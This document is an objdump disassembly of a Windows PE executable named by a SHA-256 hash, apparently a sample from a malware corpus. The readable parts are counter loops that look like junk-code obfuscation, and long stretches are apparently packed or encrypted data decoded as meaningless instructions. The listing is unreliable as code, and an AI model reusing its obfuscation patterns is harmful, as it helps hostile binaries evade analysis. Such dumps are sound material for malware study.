
ecd44707425907ae4539569c42ed4efb320daf8b36c5e8b3d184a4f7e7432b8a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433697,0x1c
  401013:	cmp    DWORD PTR ds:0x433697,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433697,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433697,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433697
  401055:	dec    eax
  401056:	mov    ds:0x433697,eax
  40105b:	mov    eax,ds:0x433697
  401060:	dec    eax
  401061:	mov    ds:0x433697,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43369b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43369f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4336d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4336af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433693
  4010b6:	mov    DWORD PTR ds:0x4336af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43372b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4336af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4336af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4336af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4336af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4336af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4336af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4336af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4336af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433677
  40113c:	mov    eax,ds:0x433733
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43371b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4335ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43361f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43365b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     dl,dh
  4011b8:	cmp    DWORD PTR [edx+0x7e7e7e34],0x7e
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [esi],edi
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x7f99b739
  40126d:	sub    eax,0xb6cc4f06
  401272:	enter  0xebcc,0xf1
  401276:	sub    eax,0x59cf322
  40127b:	adc    ebp,DWORD PTR [ecx-0x5b]
  40127e:	(bad)  
  40127f:	out    0xb9,eax
  401281:	retf   0x4b05
  401284:	xchg   esp,eax
  401285:	bound  esp,QWORD PTR [esi-0x5d662d]
  40128b:	push   edx
  40128c:	shl    BYTE PTR [edi],cl
  40128e:	push   ds
  40128f:	xor    eax,0x3d9ea41
  401294:	or     ebx,ecx
  401296:	outs   dx,BYTE PTR ds:[esi]
  401297:	cdq    
  401298:	or     BYTE PTR [ebx],bl
  40129a:	add    edx,DWORD PTR [ecx]
  40129c:	imul   ebx,DWORD PTR [ebx],0xdee47385
  4012a2:	jge    0x40130e
  4012a4:	push   0x57
  4012a6:	in     eax,0xc4
  4012a8:	sub    al,0x28
  4012aa:	call   0x72fe:0x1fcba78b
  4012b1:	inc    edx
  4012b2:	aad    0xc5
  4012b4:	dec    ebx
  4012b5:	loop   0x401275
  4012b7:	ins    DWORD PTR es:[edi],dx
  4012b8:	xchg   ebx,eax
  4012b9:	ret    
  4012ba:	ins    DWORD PTR es:[edi],dx
  4012bb:	and    eax,DWORD PTR [eax-0x2060269c]
  4012c1:	hlt    
  4012c2:	pop    esp
  4012c3:	pushf  
  4012c4:	pop    ecx
  4012c5:	xor    bh,BYTE PTR [edi+0xb3907f2]
  4012cb:	xchg   DWORD PTR [ebx-0x7dfe6611],ebx
  4012d1:	and    DWORD PTR [ebx-0x39fdd306],esp
  4012d7:	pop    es
  4012d8:	or     edx,DWORD PTR [edx+edx*1-0x2a]
  4012dc:	dec    eax
  4012dd:	mov    WORD PTR [edi+0x72],fs
  4012e0:	cwde   
  4012e1:	push   esi
  4012e2:	or     eax,0x674ace5f
  4012e7:	mov    ds:0x8ebc33cc,eax
  4012ec:	(bad)  
  4012ed:	out    0x52,al
  4012ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012f0:	mov    dl,0xfb
  4012f2:	and    eax,0xf3fef28f
  4012f7:	dec    edi
  4012f8:	loopne 0x401300
  4012fa:	jg     0x4012e0
  4012fc:	xchg   esi,eax
  4012fd:	inc    edx
  4012fe:	imul   eax,DWORD PTR [eax-0xa],0xbe5d8d63
  401305:	daa    
  401306:	jae    0x4012e4
  401308:	cmp    al,0x3c
  40130a:	bound  edi,QWORD PTR [ecx]
  40130c:	dec    ebp
  40130d:	push   ss
  40130e:	and    al,0x6e
  401310:	adc    dl,BYTE PTR [edi]
  401312:	push   esi
  401313:	adc    bh,BYTE PTR [ebp-0x75]
  401316:	shr    DWORD PTR [esi-0x54f743c3],cl
  40131c:	xor    ebx,ebx
  40131e:	retf   
  40131f:	jp     0x40135f
  401321:	data16 jb 0x4012eb
  401324:	push   edx
  401325:	es jb  0x401321
  401328:	ss mov cl,0xe3
  40132b:	outs   dx,BYTE PTR ds:[esi]
  40132c:	int    0x6d
  40132e:	adc    al,0x4f
  401330:	fmul   st,st(2)
  401332:	out    0xe8,al
  401334:	pop    ebx
  401335:	mov    ebx,0x8e9ff6c4
  40133a:	call   0x1f567215
  40133f:	daa    
  401340:	inc    ebp
  401341:	pop    edx
  401342:	dec    edx
  401343:	gs fwait
  401345:	test   bl,ch
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433653,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433653
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433653,ebx
  401366:	cmp    DWORD PTR ds:0x433653,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433653,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43360b,0x4335ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	xchg   esi,eax
  4013b4:	sub    DWORD PTR [edi+0x7e7ffa72],0x7e
  4013bb:	cli    
  4013bc:	jg     0x40143c
  4013be:	jle    0x401375
  4013c0:	cmp    ebx,DWORD PTR [eax+0x53e3826]
  4013c6:	cwde   
  4013c7:	call   0xd948:0xbd1d07c0
  4013ce:	pop    es
  4013cf:	ja     0x4013fe
  4013d1:	int    0xb0
  4013d3:	popa   
  4013d4:	mov    esi,0xde12566f
  4013d9:	mov    dl,0xc9
  4013db:	into   
  4013dc:	scas   al,BYTE PTR es:[edi]
  4013dd:	pop    esi
  4013de:	dec    ecx
  4013df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013e0:	jmp    DWORD PTR [edx+edi*2+0x2878ee0e]
  4013e7:	pop    ecx
  4013e8:	push   ds
  4013e9:	sahf   
  4013ea:	retf   
  4013eb:	(bad)  
  4013ed:	cli    
  4013ee:	xchg   edi,eax
  4013ef:	sub    eax,0x89b6f181
  4013f4:	in     al,0x9a
  4013f6:	xchg   esp,eax
  4013f7:	sub    ch,bh
  4013f9:	in     eax,dx
  4013fa:	add    ebp,edx
  4013fc:	fmul   DWORD PTR [edx+0x7a]
  4013ff:	aad    0x31
  401401:	dec    ecx
  401402:	sbb    al,0x73
  401404:	ficom  WORD PTR [edi+ebx*2-0xd1b9c1a]
  40140b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40140c:	pop    ss
  40140d:	out    0xeb,al
  40140f:	xchg   ecx,eax
  401410:	call   0x2bba18b7
  401415:	pop    ebx
  401416:	pop    ebp
  401417:	pop    ds
  401418:	mov    al,ds:0x8911e343
  40141d:	add    DWORD PTR [edi-0x576041ec],eax
  401423:	fcmovne st,st(4)
  401425:	in     al,dx
  401426:	cmp    edx,ebp
  401428:	jle    0x401481
  40142a:	call   0x28b3c637
  40142f:	lock sahf 
  401431:	push   0x3f
  401433:	inc    esp
  401434:	je     0x4014a2
  401436:	gs push 0x35ad641d
  40143c:	push   edi
  40143d:	cmp    eax,0x7b433ca4
  401442:	out    dx,al
  401443:	mov    ecx,0x7b17eb43
  401448:	inc    esp
  401449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40144a:	shl    BYTE PTR [eax+edi*2],1
  40144d:	mov    edi,0xda0838b5
  401452:	ds and al,0x4b
  401455:	(bad)  
  401456:	sub    al,0xfd
  401458:	xchg   esi,eax
  401459:	or     cl,dh
  40145b:	pop    eax
  40145c:	aaa    
  40145d:	(bad)  
  40145e:	sbb    eax,0x34da32d1
  401463:	cld    
  401464:	sub    ebx,DWORD PTR [ebx+0x70]
  401467:	addr16 xor eax,0x3da56ce
  40146d:	xchg   ebx,eax
  40146e:	outs   dx,BYTE PTR ds:[esi]
  40146f:	jb     0x40141c
  401471:	in     eax,dx
  401472:	enter  0x52f4,0x4
  401476:	shr    DWORD PTR [edi-0x5ae77216],cl
  40147c:	mov    ebp,0x95cc9de5
  401481:	adc    BYTE PTR [ecx+0x29],dl
  401484:	mov    eax,ds:0xc0a21527
  401489:	dec    eax
  40148a:	(bad)  
  40148b:	hlt    
  40148c:	fdivr  st(5),st
  40148e:	xor    eax,0x15038bed
  401493:	inc    ecx
  401494:	inc    eax
  401495:	out    dx,eax
  401496:	out    dx,al
  401497:	outs   dx,BYTE PTR ds:[esi]
  401498:	pushf  
  401499:	add    eax,0x64bb2eb2
  40149e:	jne    0x401476
  4014a0:	dec    esp
  4014a1:	dec    ebp
  4014a2:	bound  esp,QWORD PTR [eax-0xe237dad]
  4014a8:	outs   dx,DWORD PTR ds:[esi]
  4014a9:	pushf  
  4014aa:	dec    eax
  4014ab:	aas    
  4014ac:	je     0x40147b
  4014ae:	test   eax,0x2eb6313e
  4014b3:	inc    ebx
  4014b4:	cs push ecx
  4014b6:	push   0x936a33c4
  4014bb:	or     eax,0xd22a42a5
  4014c0:	push   esi
  4014c1:	jbe    0x401495
  4014c3:	loope  0x4014b5
  4014c5:	add    ch,BYTE PTR [edi]
  4014c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014c8:	add    al,0x97
  4014ca:	dec    edx
  4014cb:	and    eax,0x84fee468
  4014d0:	mov    eax,ds:0x6aa26bbf
  4014d5:	test   eax,0x3f700077
  4014da:	div    DWORD PTR [eax-0x2b79a42d]
  4014e0:	fidivr DWORD PTR [esi]
  4014e2:	mov    ds:0x28357ea2,al
  4014e7:	lahf   
  4014e8:	imul   edx,DWORD PTR [esi],0xffffffd3
  4014eb:	jne    0x4014dd
  4014ed:	mov    dh,0x35
  4014ef:	(bad)  
  4014f1:	(bad)  
  4014f2:	leave  
  4014f3:	retf   0xbbba
  4014f6:	adc    DWORD PTR [eax],eax
  4014f8:	pop    ss
  4014f9:	inc    edi
  4014fa:	dec    edx
  4014fb:	sbb    ah,0xc1
  4014fe:	scas   eax,DWORD PTR es:[edi]
  4014ff:	mov    ebp,0x93f06192
  401504:	xchg   ebx,eax
  401505:	inc    ecx
  401506:	pop    es
  401507:	adc    BYTE PTR [ebx+0x1e044ed],0xb
  40150e:	mov    edi,0xd0e363a0
  401513:	sub    dh,BYTE PTR [edi+0x4bc72813]
  401519:	test   eax,0x2f75f99c
  40151e:	popf   
  40151f:	or     ch,BYTE PTR [edx]
  401521:	leave  
  401522:	sbb    ebp,0x64
  401525:	dec    eax
  401526:	sbb    al,0xb4
  401528:	outs   dx,DWORD PTR ds:[esi]
  401529:	aas    
  40152a:	fst    DWORD PTR [edx-0x157e52c]
  401530:	push   ebx
  401531:	push   esi
  401532:	inc    DWORD PTR [edx+0x2]
  401535:	ror    esp,cl
  401537:	in     eax,0x7
  401539:	xchg   BYTE PTR [ebx],bh
  40153b:	jne    0x4014c0
  40153d:	sbb    BYTE PTR [ebx],0x7a
  401540:	fcom   DWORD PTR [esp+edx*1-0x75]
  401544:	inc    ebp
  401545:	les    esi,FWORD PTR [ecx]
  401547:	sbb    eax,0x43360f
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x3b40b1d]
  401564:	rol    BYTE PTR [esi],cl
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x401523
  40156e:	movd   mm7,DWORD PTR [esi]
  401571:	outs   dx,BYTE PTR ds:[esi]
  401572:	test   al,0x40
  401574:	imul   eax,DWORD PTR [edx+0x372e7fb5],0xea78b214
  40157e:	adc    al,0xbc
  401580:	add    ch,BYTE PTR [esi-0x38a86592]
  401586:	xor    BYTE PTR [ecx-0x51a7cba3],0x2f
  40158d:	neg    edx
  40158f:	les    esi,FWORD PTR [ebp+0x57]
  401592:	jg     0x401522
  401594:	push   es
  401595:	aam    0xc1
  401597:	scas   al,BYTE PTR es:[edi]
  401598:	mov    edi,0x13b929d2
  40159d:	adc    ebx,DWORD PTR [ecx-0x1a]
  4015a0:	rep outs dx,DWORD PTR ds:[esi]
  4015a2:	push   ebp
  4015a3:	fnstsw WORD PTR [edx-0x7e]
  4015a6:	out    dx,eax
  4015a7:	in     al,dx
  4015a8:	sbb    edi,ebx
  4015aa:	gs out dx,al
  4015ac:	mov    cl,0xbe
  4015ae:	xchg   ecx,eax
  4015af:	scas   eax,DWORD PTR es:[edi]
  4015b0:	xchg   ebp,eax
  4015b1:	daa    
  4015b2:	push   cs
  4015b3:	sub    edi,ecx
  4015b5:	push   esp
  4015b6:	iret   
  4015b7:	jae    0x40154d
  4015b9:	and    eax,0x34584744
  4015be:	xchg   BYTE PTR [ebx+0x6b],ah
  4015c1:	imul   esi,ebx,0xa6780cb8
  4015c7:	adc    dl,al
  4015c9:	mov    eax,ds:0xb0abc89a
  4015ce:	or     DWORD PTR ds:0xb6518197,edx
  4015d4:	jne    0x401562
  4015d6:	adc    edi,esi
  4015d8:	mov    ah,0xbf
  4015da:	sbb    eax,DWORD PTR [esi]
  4015dc:	out    dx,eax
  4015dd:	pop    ebx
  4015de:	or     eax,0xd950fb80
  4015e3:	sbb    al,0xf1
  4015e5:	inc    esi
  4015e6:	aam    0x2
  4015e8:	cmp    DWORD PTR [ecx+edi*2-0x62],ebx
  4015ec:	jnp    0x401601
  4015ee:	scas   eax,DWORD PTR es:[edi]
  4015ef:	add    ecx,eax
  4015f1:	test   al,0x7c
  4015f3:	pusha  
  4015f4:	or     eax,0x5a8fd7b5
  4015f9:	sbb    cl,BYTE PTR [edi]
  4015fb:	and    ah,bh
  4015fd:	push   ds
  4015fe:	mov    eax,ds:0x72a3db5c
  401603:	sbb    DWORD PTR [ecx-0x6ce43009],ebx
  401609:	adc    BYTE PTR [edi],al
  40160b:	xor    esp,ecx
  40160d:	out    dx,al
  40160e:	xor    BYTE PTR ds:0xe2f0707d,bl
  401614:	cli    
  401615:	mov    ebx,0x34bf8cef
  40161a:	scas   al,BYTE PTR es:[edi]
  40161b:	cmp    ebp,esi
  40161d:	push   0x58
  40161f:	xchg   esp,eax
  401620:	jmp    0xbf1f:0x57fa43e5
  401627:	test   BYTE PTR [esi+esi*4-0x7b],cl
  40162b:	xchg   ebx,eax
  40162c:	cmp    al,BYTE PTR [edi+0x18]
  40162f:	test   al,0xae
  401631:	push   ss
  401632:	xchg   edx,eax
  401633:	shl    BYTE PTR [eiz*1+0x7d22d902],cl
  40163a:	cmp    DWORD PTR [ebx+ebp*1+0x3],esp
  40163e:	fcomip st,st(1)
  401640:	sbb    eax,0x773af711
  401645:	xchg   ecx,eax
  401646:	pop    ds
  401647:	jecxz  0x40161f
  401649:	fnstcw WORD PTR [esi]
  40164b:	loope  0x40161a
  40164d:	sbb    bh,BYTE PTR [ebp+0x24]
  401650:	call   0x63a7:0x13103592
  401657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401658:	xchg   ebp,eax
  401659:	or     bl,cl
  40165b:	mov    dl,0x7d
  40165d:	scas   al,BYTE PTR es:[edi]
  40165e:	and    eax,0xaa443572
  401663:	or     eax,0x86080433
  401668:	iret   
  401669:	lock inc ecx
  40166b:	pop    esi
  40166c:	(bad)
  40166f:	imul   esp,DWORD PTR [eax+0x3f4d5bc6],0xa969e41e
  401679:	iret   
  40167a:	es cwde 
  40167c:	dec    ebx
  40167d:	retf   
  40167e:	inc    edx
  40167f:	dec    ecx
  401680:	popf   
  401681:	or     ebx,DWORD PTR [esi]
  401683:	je     0x40166d
  401685:	push   ss
  401686:	mov    esi,DWORD PTR [ebp-0x4b]
  401689:	sbb    eax,0x8e389378
  40168e:	inc    edi
  40168f:	sbb    eax,0xa38124d
  401694:	(bad)  
  401695:	cdq    
  401696:	and    bh,0x2c
  401699:	test   eax,0xc13d52ef
  40169e:	add    edx,ebp
  4016a0:	mov    eax,ds:0xfb51a578
  4016a5:	data16 test BYTE PTR [ebx+0xc],0x2b
  4016aa:	jno    0x4016f0
  4016ac:	out    0x58,eax
  4016ae:	cmp    eax,0x267869d4
  4016b3:	push   0xffffffc8
  4016b5:	imul   edi,DWORD PTR [esi],0x944c33d0
  4016bb:	push   ecx
  4016bc:	out    0xb7,al
  4016be:	dec    eax
  4016bf:	jmp    0x4016c2
  4016c1:	pusha  
  4016c2:	mov    ah,0x4
  4016c4:	adc    al,0xf2
  4016c6:	mov    eax,0x63c1b459
  4016cb:	out    dx,al
  4016cc:	mov    ebx,0xf32e013e
  4016d1:	pop    es
  4016d2:	jge    0x401727
  4016d4:	and    DWORD PTR [ebp+edx*4-0x52],0xffffffe3
  4016d9:	push   esi
  4016da:	test   al,0xc7
  4016dc:	int    0x1b
  4016de:	fidivr DWORD PTR [esi-0x44]
  4016e1:	xchg   BYTE PTR [eax],al
  4016e3:	shr    BYTE PTR [ebx+0x2c65c295],0x77
  4016ea:	cmp    ebp,DWORD PTR [ecx]
  4016ec:	mov    ch,0xd5
  4016ee:	pop    edx
  4016ef:	adc    eax,0x89c70343
  4016f4:	inc    ebp
  4016f5:	int3   
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4336df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4336df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4336df,ebx
  401721:	cmp    DWORD PTR ds:0x4336df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4336df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4336df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4336df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4336df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433603,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433617
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43360b
  401793:	and    ecx,DWORD PTR ds:0x43365b
  401799:	mov    DWORD PTR ds:0x43360b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43372f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43372f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43372f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43372f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43372f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43372f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43372f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43372f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4336e3,0x0
  401819:	mov    eax,ds:0x4336e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4336e3,eax
  401824:	cmp    DWORD PTR ds:0x4336e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433623
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4336e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43371f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43372b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43372b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43372b,ecx
  401878:	cmp    DWORD PTR ds:0x43372b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43372b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43372b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43372b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43372b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xd61c6ade
  4018e9:	and    DWORD PTR [edx+eax*4+0x7a],0x7e
  4018ee:	jle    0x4018ea
  4018f0:	jg     0x401970
  4018f2:	jle    0x4018ef
  4018f4:	mov    eax,0xd1393da6
  4018f9:	sub    DWORD PTR [edi-0x7fe2eea2],ebp
  4018ff:	and    eax,0x91e94896
  401904:	sbb    edi,0xffffffa0
  401907:	loop   0x40189c
  401909:	cmp    eax,0x1110aef2
  40190e:	mov    dl,0x13
  401910:	mov    BYTE PTR [esi],dl
  401912:	xchg   ebp,eax
  401913:	mov    esp,0x48c84c83
  401918:	push   ecx
  401919:	in     al,dx
  40191a:	stos   DWORD PTR es:[edi],eax
  40191b:	imul   edx,DWORD PTR [edi-0x7933515d],0xffffff94
  401922:	mov    cl,0x74
  401924:	stos   DWORD PTR es:[edi],eax
  401925:	fcomi  st,st(0)
  401927:	or     bl,BYTE PTR [esi-0x242cd77a]
  40192d:	imul   ecx,DWORD PTR [ebx+0x1b],0xffffffb3
  401931:	mov    ah,0xa4
  401933:	js     0x401981
  401935:	jp     0x40197e
  401937:	clc    
  401938:	fisubr DWORD PTR [eax+0x12]
  40193b:	dec    ecx
  40193c:	sbb    ebx,DWORD PTR [ebp+0x26d7e91f]
  401942:	cmc    
  401943:	lahf   
  401944:	ror    BYTE PTR [edi+0x5],1
  401947:	mov    edi,0x39c470ed
  40194c:	(bad)  
  40194d:	fcom   DWORD PTR [edx-0x331850e7]
  401953:	jnp    0x40191a
  401955:	jmp    0x5377:0xf5844071
  40195c:	mov    eax,0xf74a4118
  401961:	aam    0xe9
  401963:	and    BYTE PTR [ebx-0x7d7c1ec8],bl
  401969:	fmul   DWORD PTR [ebx+0x3505a39f]
  40196f:	int3   
  401970:	mov    cl,0x8b
  401972:	lods   al,BYTE PTR ds:[esi]
  401973:	dec    esi
  401974:	sub    al,0x4a
  401976:	pop    esi
  401977:	adc    eax,eax
  401979:	test   DWORD PTR [bp+di+0x3688],0x719ff7e5
  401982:	jp     0x40190e
  401984:	inc    ebx
  401985:	fbstp  TBYTE PTR [edx+edi*2]
  401988:	push   ebp
  401989:	pop    ebx
  40198a:	into   
  40198b:	inc    ebx
  40198c:	ja     0x4019ae
  40198e:	mov    WORD PTR [bx+di+0x7a],cs
  401992:	call   0x515f:0x7d29cfe3
  401999:	jmp    0x9e910786
  40199e:	xchg   ebx,eax
  40199f:	das    
